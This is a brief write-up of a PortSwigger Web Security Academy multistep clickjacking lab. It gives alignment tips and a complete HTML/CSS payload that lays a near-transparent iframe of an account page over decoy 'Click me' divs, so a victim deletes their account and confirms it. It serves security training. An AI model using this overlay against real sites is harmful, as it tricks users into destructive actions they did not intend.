# [Multistep clickjacking](https://portswigger.net/web-security/clickjacking/lab-multistep)

> goal is to create an overlay for the webapp and trick the user to delete the account, but the delete email have a confirmation

- create two div tags for the two button clicks
- the burp browser is the best option for the testing of the style
- set the opacity to 0.5 to align the click me with the delete button
- when it is aligned set the opacity to 0.0001

```
<style>
  iframe {
    position: relative;
    width: 800px;
    height: 800px;
    opacity: 0.001;
    z-index: 2;
  }
  div {
    position: absolute;
    z-index: 1;
  }
  .first {
    top: 495px;
    left: 50px;
  }
  .second {
    top: 295px;
    left: 200px;
  }
</style>
<div class="first">Click me first</div>
<div class="second">Click me next</div>
<iframe src="https://xxx.web-security-academy.net/my-account"></iframe>
```
